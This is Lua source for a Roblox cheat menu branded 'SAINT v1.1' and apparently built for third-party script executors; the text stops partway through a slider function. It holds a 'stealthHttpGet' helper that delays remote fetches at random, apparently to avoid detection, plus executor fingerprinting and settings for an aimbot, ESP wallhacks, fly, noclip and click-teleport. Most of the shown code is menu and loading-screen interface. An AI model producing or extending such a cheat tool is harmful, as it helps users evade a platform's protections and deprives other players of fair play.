--[[
 ________  ________  ___  ________   _________        _____ ______   _______   ________   ___  ___     
|\   ____\|\   __  \|\  \|\   ___  \|\___   ___\     |\   _ \  _   \|\  ___ \ |\   ___  \|\  \|\  \    
\ \  \___|\ \  \|\  \ \  \ \  \\ \  \|___ \  \_|     \ \  \\\__\ \  \ \   __/|\ \  \\ \  \ \  \\\  \   
 \ \_____  \ \   __  \ \  \ \  \\ \  \   \ \  \       \ \  \\|__| \  \ \  \_|/_\ \  \\ \  \ \  \\\  \  
  \|____|\  \ \  \ \  \ \  \ \  \\ \  \   \ \  \       \ \  \    \ \  \ \  \_|\ \ \  \\ \  \ \  \\\  \ 
    ____\_\  \ \__\ \__\ \__\ \__\\ \__\   \ \__\       \ \__\    \ \__\ \_______\ \__\\ \__\ \_______\
   |\_________\|__|\|__|\|__|\|__| \|__|    \|__|        \|__|     \|__|\|_______|\|__| \|__|\|_______|
   \|_________|                                                                                        
                                                                                                       
                                                                                                       
                                                                                                                                                                  
        nakaw gusto? aral ayaw?

]]--


if not game then
    return
end

local ps = game:GetService("Players")
local ts = game:GetService("TweenService")
local uis = game:GetService("UserInputService")
local rs = game:GetService("RunService")

local lp = ps.LocalPlayer
local pg = lp:WaitForChild("PlayerGui")

local function stealthHttpGet(url, bypass)
    task.wait(0.5 + math.random() * 0.5)
    
    local sc, rt = pcall(function()
        if typeof(game.HttpGet) == "function" then
            return game:HttpGet(url, bypass)
        elseif typeof(game.HttpGetAsync) == "function" then
            return game:HttpGetAsync(url)
        elseif typeof(game.GetAsync) == "function" then
            return game:GetAsync(url)
        end
        return nil
    end)
    
    if sc and rt then
        return rt
    end
    
    task.wait(0.3)
    local hsc, hrt = pcall(function()
        local hs = game:GetService("HttpService")
        if hs then
            return hs:GetAsync(url)
        end
        return nil
    end)
    
    if hsc and hrt then
        return hrt
    end
    
    return nil
end

_G.MenuStates = _G.MenuStates or {
    toggles = {},
    textboxes = {},
    sliders = {}
}

local function createLoadingScreen()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = math.random(10000,99999)
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    screenGui.IgnoreGuiInset = true
    screenGui.Enabled = true

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "a"
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.Position = UDim2.new(0, 0, 0, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    mainFrame.BackgroundTransparency = 1
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    
    local container = Instance.new("Frame")
    container.Name = "c"
    container.Size = UDim2.new(0, 600, 0, 400)
    container.Position = UDim2.new(0.5, 0, 0.5, 0)
    container.AnchorPoint = Vector2.new(0.5, 0.5)
    container.BackgroundTransparency = 1
    container.Parent = mainFrame
    
    local title = Instance.new("TextLabel")
    title.Name = "t"
    title.Size = UDim2.new(1, 0, 0, 60)
    title.Position = UDim2.new(0.5, 0, 0, 0)
    title.AnchorPoint = Vector2.new(0.5, 0)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.RichText = true
    title.Text = '<font color="rgb(255,255,255)" stroke="rgb(200,200,255)" strokeThickness="2">SAINT v1.</font><font color="rgb(255,0,0)">1</font>'
    title.TextSize = 48
    title.TextStrokeTransparency = 0.2
    title.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
    title.Parent = container

    local function getExecutorName()
        if syn and syn.request then
            return "Synapse X"
        elseif identifyexecutor then
            return identifyexecutor() or "Unknown"
        elseif getexecutorname then
            return getexecutorname() or "Unknown"
        elseif KRNL_LOADED then
            return "KRNL"
        elseif FLUXUS then
            return "Fluxus"
        elseif issirhurt then
            return "Sirhurt"
        elseif Solara then
            return "Solara"
        elseif OXYGEN_LOADED then
            return "Oxygen U"
        else
            return "Unknown Executor"
        end
    end

    local function getDeviceType()
        local uis2 = game:GetService("UserInputService")
        if uis2.TouchEnabled and not uis2.KeyboardEnabled then
            return "Mobile"
        elseif uis2.GamepadEnabled and not uis2.KeyboardEnabled then
            return "Console"
        elseif uis2.TouchEnabled and uis2.KeyboardEnabled then
            return "Tablet"
        else
            return "Desktop"
        end
    end
    
    local executorName = getExecutorName()
    local deviceType = getDeviceType()

    local statusText = Instance.new("TextLabel")
    statusText.Name = "st"
    statusText.Size = UDim2.new(1, 0, 0, 25)
    statusText.Position = UDim2.new(0.5, 0, 0, 70)
    statusText.AnchorPoint = Vector2.new(0.5, 0)
    statusText.BackgroundTransparency = 1
    statusText.Font = Enum.Font.Gotham
    statusText.Text = "Initializing..."
    statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
    statusText.TextSize = 14
    statusText.Parent = container

    local userText = Instance.new("TextLabel")
    userText.Name = "ut"
    userText.Size = UDim2.new(1, 0, 0, 25)
    userText.Position = UDim2.new(0.5, 0, 1, -90)
    userText.AnchorPoint = Vector2.new(0.5, 0)
    userText.BackgroundTransparency = 1
    userText.Font = Enum.Font.GothamBold
    userText.Text = "Welcome, " .. lp.Name .. "!"
    userText.TextColor3 = Color3.fromRGB(255, 255, 255)
    userText.TextSize = 14
    userText.Parent = container

    local versionText = Instance.new("TextLabel")
    versionText.Name = "vt"
    versionText.Size = UDim2.new(1, -40, 0, 18)
    versionText.Position = UDim2.new(0.5, 0, 1, -45)
    versionText.AnchorPoint = Vector2.new(0.5, 0)
    versionText.BackgroundTransparency = 1
    versionText.Font = Enum.Font.Gotham
    versionText.Text = "Saint v1.1 | Updated: November 2025 | Executor: " .. executorName .. " | Device: " .. deviceType
    versionText.TextColor3 = Color3.fromRGB(140, 140, 140)
    versionText.TextSize = 11
    versionText.TextWrapped = true
    versionText.Parent = container

    local creditsText = Instance.new("TextLabel")
    creditsText.Name = "ct"
    creditsText.Size = UDim2.new(1, 0, 0, 18)
    creditsText.Position = UDim2.new(0.5, 0, 1, -20)
    creditsText.AnchorPoint = Vector2.new(0.5, 0)
    creditsText.BackgroundTransparency = 1
    creditsText.Font = Enum.Font.Gotham
    creditsText.Text = "Developed by _kean999"
    creditsText.TextColor3 = Color3.fromRGB(120, 120, 120)
    creditsText.TextSize = 11
    creditsText.Parent = container

    local centerImage = Instance.new("ImageLabel")
    centerImage.Name = "img"
    centerImage.Size = UDim2.new(0, 120, 0, 120)
    centerImage.Position = UDim2.new(0.5, 0, 0, 130)
    centerImage.AnchorPoint = Vector2.new(0.5, 0)
    centerImage.BackgroundTransparency = 1
    centerImage.Image = ""
    centerImage.ImageColor3 = Color3.fromRGB(255, 255, 255)
    centerImage.ImageTransparency = 0
    centerImage.Parent = container

    local function pulseImage()
        local pulseUp = ts:Create(
            centerImage,
            TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
            {Size = UDim2.new(0, 130, 0, 130)}
        )
        local pulseDown = ts:Create(
            centerImage,
            TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
            {Size = UDim2.new(0, 120, 0, 120)}
        )
        
        pulseUp.Completed:Connect(function()
            pulseDown:Play()
        end)
        pulseDown.Completed:Connect(function()
            pulseUp:Play()
        end)
        
        pulseUp:Play()
    end
    task.spawn(pulseImage)

    local loadingBarContainer = Instance.new("Frame")
    loadingBarContainer.Name = "bc"
    loadingBarContainer.Size = UDim2.new(0, 400, 0, 8)
    loadingBarContainer.Position = UDim2.new(0.5, 0, 0, 280)
    loadingBarContainer.AnchorPoint = Vector2.new(0.5, 0)
    loadingBarContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    loadingBarContainer.BorderSizePixel = 0
    loadingBarContainer.Parent = container

    local corner1 = Instance.new("UICorner")
    corner1.CornerRadius = UDim.new(0, 10)
    corner1.Parent = loadingBarContainer

    local loadingBar = Instance.new("Frame")
    loadingBar.Name = "bar"
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.Position = UDim2.new(0, 0, 0, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    loadingBar.BorderSizePixel = 0
    loadingBar.Parent = loadingBarContainer

    local corner2 = Instance.new("UICorner")
    corner2.CornerRadius = UDim.new(0, 10)
    corner2.Parent = loadingBar

    loadingBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)


    local spinner = Instance.new("ImageLabel")
    spinner.Name = "sp"
    spinner.Size = UDim2.new(0, 60, 0, 60)
    spinner.Position = UDim2.new(0.5, 0, 0, 200)
    spinner.AnchorPoint = Vector2.new(0.5, 0)
    spinner.BackgroundTransparency = 1
    spinner.Image = "rbxassetid://596283333"
    spinner.ImageColor3 = Color3.fromRGB(225, 225, 225)
    spinner.ImageTransparency = 0.3
    spinner.Parent = container

    screenGui.Parent = pg

    local function createSpinnerAnimation()

        local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1)
        local tween = ts:Create(spinner, tweenInfo, {Rotation = 360})
        tween:Play()

        screenGui.Destroying:Connect(function()
            tween:Cancel()
        end)
    end
    
    local function animateLoadingBar()
        local duration = 5

        local statusMessages = {
            {time = 0, text = "Loading..."},
            {time = 1, text = "Please wait..."},
            {time = 2, text = "Initializing..."},
            {time = 3, text = "Almost done..."},
            {time = 4, text = "Finalizing..."},
            {time = 7.5, text = "Loading game scripts..."},
            {time = 9, text = "Finalizing setup..."},
            {time = 9.5, text = "Ready!"}
        }

        local barTween = ts:Create(
            loadingBar,
            TweenInfo.new(duration, Enum.EasingStyle.Linear),
            {Size = UDim2.new(1, 0, 1, 0)}
        )
        barTween:Play()

        local startTime = time()
        local currentStatusIndex = 1
        
        task.spawn(function()
            while time() - startTime < duration do
                local elapsed = time() - startTime

                if currentStatusIndex <= #statusMessages then
                    if elapsed >= statusMessages[currentStatusIndex].time then
                        statusText.Text = statusMessages[currentStatusIndex].text
                        currentStatusIndex = currentStatusIndex + 1
                    end
                end
                
                task.wait()
            end
            statusText.Text = "Complete!"
        end)

        task.wait(duration)
        
        local fadeOut = ts:Create(mainFrame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
        fadeOut:Play()
        fadeOut.Completed:Wait()
        screenGui:Destroy()
    end

    local fadeIn = ts:Create(
        mainFrame,
        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {BackgroundTransparency = 0}
    )
    fadeIn:Play()

    task.spawn(createSpinnerAnimation)
    animateLoadingBar()
end

createLoadingScreen()
task.wait(2)

local function init()
    _G.Features = {
        Fly = false,
        NoClip = false
    }
    _G.Pos1 = _G.Pos1 or UDim2.new(0.5, -325, 0.5, -250)
    _G.State1 = _G.State1 or false
    
    _G.AimbotSettings = _G.AimbotSettings or {
        Enabled = false,
        ShowFOV = false,
        FOV = 150,
        Smoothness = 0.5,
        Keybind = Enum.KeyCode.E,
        MaxDistance = 2000,
        TargetBone = "Head",
        TeamCheck = false,
        FriendCheck = false,
        VisibleCheck = false,
        SpectatorCheck = true
    }
    
    _G.ESP_Settings = _G.ESP_Settings or {
        LineColor = Color3.fromRGB(255, 255, 255),
        ChamsColor = Color3.fromRGB(255, 255, 255),
        ChamsAllyColor = Color3.fromRGB(0, 170, 255),
        MaxDistance = 2000,
        NameFormat = "both"
    }
    
    _G.NameESPEnabled = _G.NameESPEnabled or false
    _G.DistanceESPEnabled = _G.DistanceESPEnabled or false
    _G.ESP_Elements = _G.ESP_Elements or {}
    _G.DistanceESPLabels = _G.DistanceESPLabels or {}
    
    _G.Flag1 = _G.Flag1 or false
    _G.Gui1 = _G.Gui1 or nil
    _G.Gui2 = _G.Gui2 or nil
    _G.Gui3 = _G.Gui3 or nil
    _G.Gui4 = _G.Gui4 or nil
    _G.Gui5 = _G.Gui5 or nil
    _G.Gui6 = _G.Gui6 or nil
    _G.ShopGui = _G.ShopGui or nil
    _G.BMGui = _G.BMGui or nil
    _G.Key1 = _G.Key1 or nil
    _G.CurrentKeybind = _G.CurrentKeybind or Enum.KeyCode.RightControl
    _G.MenuHasLoaded = _G.MenuHasLoaded or false
    _G.BagongBaryoInstantRespawn = _G.BagongBaryoInstantRespawn or false
    _G.ESPLineConnection = _G.ESPLineConnection or nil
    _G.FlyConnection = _G.FlyConnection or nil
    _G.NoClipConnection = _G.NoClipConnection or nil
    _G.ClickTPConnection = _G.ClickTPConnection or nil
end
init()

task.wait(0.5)

local Config = {
    MenuTitle = "SAINT v1.1",
    Theme = {
        Primary = Color3.fromRGB(0, 0, 0),
        Secondary = Color3.fromRGB(5, 5, 5),
        Accent = Color3.fromRGB(20, 20, 20),
        AccentHover = Color3.fromRGB(30, 30, 30),
        Success = Color3.fromRGB(67, 181, 129),
        Danger = Color3.fromRGB(240, 71, 71),
        Text = Color3.fromRGB(255, 255, 255),
        TextDim = Color3.fromRGB(150, 150, 150),
        Border = Color3.fromRGB(40, 40, 40),
    },
    Animation = {
        Speed = 0.3,
        Style = Enum.EasingStyle.Quart,
        Direction = Enum.EasingDirection.Out
    }
}

local Utils = {}

function Utils.CreateTween(instance, properties, duration, style, direction)
    local tweenInfo = TweenInfo.new(
        duration or Config.Animation.Speed,
        style or Config.Animation.Style,
        direction or Config.Animation.Direction
    )
    return ts:Create(instance, tweenInfo, properties)
end

function Utils.RoundCorners(parent, radius)

    return nil
end

function Utils.AddStroke(parent, color, thickness)
    local stroke = Instance.new("UIStroke")
    stroke.Color = color or Config.Theme.Border
    stroke.Thickness = thickness or 1
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = parent
    return stroke
end

function Utils.CreateGradient(parent, color1, color2, rotation)
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, color1),
        ColorSequenceKeypoint.new(1, color2)
    })
    gradient.Rotation = rotation or 90
    gradient.Parent = parent
    return gradient
end

function Utils.MakeDraggable(frame, targetFrame)

    local dragTarget = targetFrame or frame
    local dragging = false
    local dragInput, mousePos, framePos

    local sliderActive = false
    
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then

            local success, mouseTarget = pcall(function()
                return uis:GetMouseTarget()
            end)

            if _G.SliderDragging then
                for sliderContainer, isDragging in pairs(_G.SliderDragging) do
                    if isDragging then
                        return
                    end
                end
            end
            
            if success and mouseTarget then

                local current = mouseTarget
                local maxDepth = 15
                local depth = 0
                
                while current and depth < maxDepth do

                    if current.Name == "SliderBack" or 
                       current.Name == "SliderHandle" or 
                       current.Name == "Slider" or
                       (current.Parent and current.Parent.Name == "Slider") then
                        sliderActive = true
                        return
                    end


                    if frame == dragTarget then

                        local checkElement = current
                        local foundInteractive = false
                        local checkDepth = 0
                        while checkElement and checkDepth < 15 do

                            if checkElement:IsA("TextButton") or checkElement:IsA("TextBox") or checkElement:IsA("ImageButton") then
                                foundInteractive = true
                                break
                            end

                            if checkElement == frame then
                                break
                            end
                            checkElement = checkElement.Parent
                            checkDepth = checkDepth + 1
                        end

                        if foundInteractive then
                            return
                        end

                        break
                    else

                        if current:IsA("TextButton") or current:IsA("ImageButton") or current:IsA("TextBox") then
                            if current ~= frame and current.Name ~= "TitleBar" then
                                return
                            end
                        end
                    end

                    current = current.Parent
                    depth = depth + 1

                    if current == frame or current == dragTarget or current == nil then
                        break
                    end
                end
            end
            
            sliderActive = false
            dragging = true
            mousePos = input.Position
            framePos = dragTarget.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    sliderActive = false

                    if dragTarget.Name == "a" then
                        _G.Pos1 = dragTarget.Position
                    end
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)

    uis.InputChanged:Connect(function(input)
        if input == dragInput and dragging and not sliderActive then
            local delta = input.Position - mousePos
            local newPosition = UDim2.new(
                framePos.X.Scale,
                framePos.X.Offset + delta.X,
                framePos.Y.Scale,
                framePos.Y.Offset + delta.Y
            )

            dragTarget.Position = newPosition
            if dragTarget.Name == "a" then
                _G.Pos1 = newPosition
            end
        end
    end)
end

local GUI = {}

function GUI.CreateScreenGui()
    if _G.Gui1 and _G.Gui1.Parent then
        return _G.Gui1
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = math.random(10000,99999)
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = pg
    
    _G.Gui1 = screenGui
    
    return screenGui
end

function GUI.CreateMainFrame(parent)

    local existing = parent:FindFirstChild("a")
    if existing then
        return existing
    end
    
    local main = Instance.new("Frame")
    main.Name = "a"

    local savedSize = _G.State1 and UDim2.new(0, 650, 0, 45) or UDim2.new(0, 650, 0, 500)
    main.Size = savedSize
    main.Position = _G.Pos1 or UDim2.new(0.5, -325, 0.5, -250)
    main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    main.BorderSizePixel = 0
    main.ClipsDescendants = true
    main.Parent = parent


    
    return main
end

function GUI.CreateTopBar(parent)
    local topBar = Instance.new("Frame")
    topBar.Name = "tb"
    topBar.Size = UDim2.new(1, 0, 0, 45)
    topBar.BackgroundTransparency = 1
    topBar.BorderSizePixel = 0
    topBar.Parent = parent

    Utils.MakeDraggable(topBar, parent)

    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(0, 200, 1, 0)
    title.Position = UDim2.new(0, 15, 0, 0)
    title.BackgroundTransparency = 1
    title.RichText = true
    title.Text = '<font color="rgb(255,255,255)">SAINT v1.</font><font color="rgb(255,0,0)">1</font>'
    title.TextColor3 = Config.Theme.Text
    title.TextSize = 18
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = topBar


    local closeBtn = Instance.new("TextButton")
    closeBtn.Name = "cb"
    closeBtn.Size = UDim2.new(0, 35, 0, 35)
    closeBtn.Position = UDim2.new(1, -40, 0.5, -17.5)
    closeBtn.BackgroundTransparency = 1
    closeBtn.BorderSizePixel = 0
    closeBtn.AutoButtonColor = false
    closeBtn.Text = "x"
    closeBtn.TextColor3 = Config.Theme.Text
    closeBtn.TextSize = 18
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.Parent = topBar
    
    closeBtn.MouseButton1Click:Connect(function()
        _G.Flag1 = false
        parent.Parent:Destroy()
    end)

    local minimizeBtn = Instance.new("TextButton")
    minimizeBtn.Name = "mb"
    minimizeBtn.Size = UDim2.new(0, 35, 0, 35)
    minimizeBtn.Position = UDim2.new(1, -80, 0.5, -17.5)
    minimizeBtn.BackgroundTransparency = 1
    minimizeBtn.BorderSizePixel = 0
    minimizeBtn.AutoButtonColor = false
    minimizeBtn.Text = "-"
    minimizeBtn.TextColor3 = Config.Theme.Text
    minimizeBtn.TextSize = 18
    minimizeBtn.Font = Enum.Font.GothamBold
    minimizeBtn.Parent = topBar

    local isMinimized = _G.State1 or false
    local originalSize = parent.Size

    minimizeBtn.Text = isMinimized and "+" or "−"
    
    minimizeBtn.MouseButton1Click:Connect(function()
        isMinimized = not isMinimized
        _G.State1 = isMinimized
        if isMinimized then

            parent.Size = UDim2.new(0, 650, 0, 45)
            minimizeBtn.Text = "+"

        else

            parent.Size = originalSize
            minimizeBtn.Text = "−"
        end
    end)
    
    return topBar
end

function GUI.CreateUserInfo(parent)
    local userInfo = Instance.new("Frame")
    userInfo.Name = "ui"
    userInfo.Size = UDim2.new(0, 150, 0, 80)
    userInfo.Position = UDim2.new(0, 10, 0, 50)
    userInfo.BackgroundTransparency = 1
    userInfo.BorderSizePixel = 0
    userInfo.Parent = parent

    local avatarFrame = Instance.new("Frame")
    avatarFrame.Name = "af"
    avatarFrame.Size = UDim2.new(0, 50, 0, 50)
    avatarFrame.Position = UDim2.new(0, 10, 0, 15)
    avatarFrame.BackgroundTransparency = 1
    avatarFrame.BorderSizePixel = 0
    avatarFrame.Parent = userInfo
    
    local avatar = Instance.new("ImageLabel")
    avatar.Name = "av"
    avatar.Size = UDim2.new(1, 0, 1, 0)
    avatar.BackgroundTransparency = 1
    avatar.Image = ps:GetUserThumbnailAsync(lp.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
    avatar.Parent = avatarFrame

    local username = Instance.new("TextLabel")
    username.Name = "un"
    username.Size = UDim2.new(0, 80, 0, 25)
    username.Position = UDim2.new(0, 65, 0, 15)
    username.BackgroundTransparency = 1
    username.Text = lp.Name
    username.TextColor3 = Config.Theme.Text
    username.TextSize = 12
    username.Font = Enum.Font.GothamBold
    username.TextXAlignment = Enum.TextXAlignment.Left
    username.TextTruncate = Enum.TextTruncate.AtEnd
    username.Parent = userInfo

    local displayName = Instance.new("TextLabel")
    displayName.Name = "dn"
    displayName.Size = UDim2.new(0, 80, 0, 20)
    displayName.Position = UDim2.new(0, 65, 0, 40)
    displayName.BackgroundTransparency = 1
    displayName.Text = "@" .. lp.DisplayName
    displayName.TextColor3 = Config.Theme.TextDim
    displayName.TextSize = 10
    displayName.Font = Enum.Font.GothamMedium
    displayName.TextXAlignment = Enum.TextXAlignment.Left
    displayName.TextTruncate = Enum.TextTruncate.AtEnd
    displayName.Parent = userInfo
    
    return userInfo
end

function GUI.CreateTabContainer(parent)
    local container = Instance.new("Frame")
    container.Name = "TabContainer"
    container.Size = UDim2.new(0, 150, 1, -145)
    container.Position = UDim2.new(0, 10, 0, 140)
    container.BackgroundTransparency = 1
    container.BorderSizePixel = 0
    container.Parent = parent
    container.ClipsDescendants = true
    
    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Name = "ScrollFrame"
    scrollFrame.Size = UDim2.new(1, 0, 1, 0)
    scrollFrame.Position = UDim2.new(0, 0, 0, 0)
    scrollFrame.BackgroundTransparency = 1
    scrollFrame.BorderSizePixel = 0
    scrollFrame.ScrollBarThickness = 4
    scrollFrame.ScrollBarImageColor3 = Config.Theme.Accent
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    scrollFrame.Parent = container
    
    local listLayout = Instance.new("UIListLayout")
    listLayout.Padding = UDim.new(0, 8)
    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
    listLayout.Parent = scrollFrame
    
    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0, 10)
    padding.PaddingBottom = UDim.new(0, 10)
    padding.PaddingLeft = UDim.new(0, 10)
    padding.PaddingRight = UDim.new(0, 10)
    padding.Parent = scrollFrame

    listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 20)
    end)
    
    return scrollFrame
end

function GUI.CreateContentContainer(parent)
    local container = Instance.new("Frame")
    container.Name = "ContentContainer"
    container.Size = UDim2.new(0, 465, 1, -55)
    container.Position = UDim2.new(0, 170, 0, 50)
    container.BackgroundTransparency = 1
    container.BorderSizePixel = 0
    container.ClipsDescendants = true
    container.Parent = parent
    
    return container
end

function GUI.CreateTab(parent, name, icon, layoutOrder)
    local tab = Instance.new("TextButton")
    tab.Name = "Tab_" .. name
    tab.Size = UDim2.new(1, 0, 0, 40)
    tab.BackgroundTransparency = 1
    tab.BorderSizePixel = 0
    tab.AutoButtonColor = false
    tab.Text = (icon or "") .. "  " .. name
    tab.TextColor3 = Config.Theme.TextDim
    tab.TextSize = 13
    tab.Font = Enum.Font.GothamBold
    tab.TextXAlignment = Enum.TextXAlignment.Left
    tab.LayoutOrder = layoutOrder or 0
    tab.Parent = parent
    
    return tab
end

function GUI.CreateTabContent(parent, name)
    local content = Instance.new("ScrollingFrame")
    content.Name = "Content_" .. name
    content.Size = UDim2.new(1, 0, 1, 0)
    content.BackgroundTransparency = 1
    content.BorderSizePixel = 0
    content.ScrollBarThickness = 6
    content.ScrollBarImageColor3 = Config.Theme.Accent
    content.CanvasSize = UDim2.new(0, 0, 0, 0)
    content.Visible = false
    content.Parent = parent
    
    local listLayout = Instance.new("UIListLayout")
    listLayout.Padding = UDim.new(0, 10)
    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
    listLayout.Parent = content
    
    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0, 10)
    padding.PaddingBottom = UDim.new(0, 10)
    padding.PaddingLeft = UDim.new(0, 15)
    padding.PaddingRight = UDim.new(0, 15)
    padding.Parent = content

    listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        content.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 20)
    end)
    
    return content
end

local Components = {}

function Components.CreateButton(p, t, cb)
    local bt = Instance.new("TextButton")
    bt.Name = "Button"
    bt.Size = UDim2.new(1, 0, 0, 40)
    bt.BackgroundTransparency = 1
    bt.BorderSizePixel = 0
    bt.AutoButtonColor = false
    bt.Text = t
    bt.TextColor3 = Config.Theme.Text
    bt.TextSize = 13
    bt.Font = Enum.Font.GothamBold
    bt.TextXAlignment = Enum.TextXAlignment.Center
    bt.Parent = p
    
    bt.MouseButton1Click:Connect(function()
        if cb then
            cb()
        end
    end)
    
    return bt
end

function Components.CreateToggle(p, t, ds, cb)
    local sv = _G.MenuStates.toggles[t]
    local is = sv ~= nil and sv or ds
    
    local cn = Instance.new("Frame")
    cn.Name = "Toggle"
    cn.Size = UDim2.new(1, 0, 0, 40)
    cn.BackgroundTransparency = 1
    cn.BorderSizePixel = 0
    cn.Parent = p
    
    local lb = Instance.new("TextLabel")
    lb.Size = UDim2.new(1, -60, 1, 0)
    lb.Position = UDim2.new(0, 15, 0, 0)
    lb.BackgroundTransparency = 1
    lb.Text = t
    lb.TextColor3 = Config.Theme.Text
    lb.TextSize = 13
    lb.Font = Enum.Font.GothamMedium
    lb.TextXAlignment = Enum.TextXAlignment.Left
    lb.Parent = cn
    
    local tb = Instance.new("TextButton")
    tb.Name = "ToggleButton"
    tb.Size = UDim2.new(0, 50, 0, 25)
    tb.Position = UDim2.new(1, -60, 0.5, -12.5)
    tb.BackgroundTransparency = 1
    tb.BorderSizePixel = 0
    tb.AutoButtonColor = false
    tb.Text = is and "ON" or "OFF"
    tb.TextColor3 = Config.Theme.Text
    tb.TextSize = 12
    tb.Font = Enum.Font.GothamBold
    tb.Parent = cn
    
    local st = is
    
    if sv ~= nil and cb then
        task.spawn(function()
            cb(st)
        end)
    end
    
    tb.MouseButton1Click:Connect(function()
        st = not st
        
        _G.MenuStates.toggles[t] = st
        
        tb.Text = st and "ON" or "OFF"
        
        if cb then
            cb(st)
        end
    end)
    
    return cn
end

function Components.CreateSimpleRPMenu(title, buttons)
    local rpGui = Instance.new("ScreenGui")
    rpGui.Name = math.random(10000,99999)
    rpGui.ResetOnSpawn = false
    rpGui.Parent = pg
    
    local modal = Instance.new("Frame")
    modal.Size = UDim2.new(0, 250, 0, 60 + (#buttons * 35))
    modal.Position = UDim2.new(0.5, -125, 0.5, -(60 + (#buttons * 35))/2)
    modal.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    modal.BorderSizePixel = 0
    modal.Parent = rpGui
    Utils.RoundCorners(modal, 12)
    Utils.MakeDraggable(modal)

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -40, 0, 40)
    titleLabel.Position = UDim2.new(0, 10, 0, 10)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = title
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 16
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Center
    titleLabel.Parent = modal

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0, 10)
    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    closeBtn.Text = "x"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.TextSize = 14
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.BorderSizePixel = 0
    closeBtn.Parent = modal
    Utils.RoundCorners(closeBtn, 8)
    closeBtn.MouseButton1Click:Connect(function()
        rpGui:Destroy()
    end)

    for i, btn in ipairs(buttons) do
        local textBtn = Instance.new("TextButton")
        textBtn.Size = UDim2.new(1, -20, 0, 30)
        textBtn.Position = UDim2.new(0, 10, 0, 45 + (i-1) * 35)
        textBtn.BackgroundTransparency = 1
        textBtn.Text = btn.text
        textBtn.TextColor3 = Config.Theme.Text
        textBtn.TextSize = 12
        textBtn.Font = Enum.Font.Gotham
        textBtn.TextXAlignment = Enum.TextXAlignment.Center
        textBtn.BorderSizePixel = 0
        textBtn.Parent = modal
        textBtn.MouseButton1Click:Connect(btn.callback)
    end
    
    return rpGui
end

function Components.CreateSlider(parent, text, min, max, default, callback)
    local container = Instance.new("Frame")
    container.Name = "Slider"
    container.Size = UDim2.new(1, 0, 0, 55)
    container.BackgroundColor3 = Config.Theme.Primary
    container.BackgroundTransparency = 0.3
    container.BorderSizePixel = 0
    container.Active = true
    container.Parent = parent
    
    Utils.RoundCorners(container, 8)
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -80, 0, 20)
    label.Position = UDim2.new(0, 15, 0, 5)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Config.Theme.Text
    label.TextSize = 13
    label.Font = Enum.Font.GothamMedium
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = container
    
    local valueLabel = Instance.new("TextLabel")
    valueLabel.Size = UDim2.new(0, 60, 0, 20)
    valueLabel.Position = UDim2.new(1, -70, 0, 5)
    valueLabel.BackgroundTransparency = 1
    valueLabel.Text = tostring(default)
    valueLabel.TextColor3 = Config.Theme.Accent
    valueLabel.TextSize = 14
